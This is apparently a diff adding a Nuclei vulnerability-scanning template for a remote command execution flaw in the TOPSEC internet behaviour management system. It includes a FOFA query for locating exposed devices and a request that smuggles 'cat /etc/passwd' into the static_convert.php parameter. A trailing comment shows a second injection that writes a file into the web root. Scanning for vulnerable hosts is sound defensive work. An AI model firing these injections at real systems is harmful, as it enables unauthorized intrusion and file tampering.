@@ -1,0 +1,32 @@
+id: topsec-ac-static_convert-rce
+info:
+  name: 天融信 TOPSEC 上网行为管理系统 static convert - rce
+  author: leadlife
+  severity: critical
+  description: 天融信TOPSEC_static_convert远程命令执行漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E5%A4%A9%E8%9E%8D%E4%BF%A1TOPSEC_static_convert%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="天融信-上网行为管理系统"
+  tags: topsec,rce,topsecac
+
+http:
+  - raw:
+      - |
+        GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||cat%20%2fetc%2fpasswd HTTP/1.1 
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+      - type: status
+        status:
+          - 200
+
+# we can also upload file
+# p?blocks[0]=||%20echo%20%27{{randstr}}%27%20%3E%20/var/www/html/config_application.txt%0a HTTP/1.1
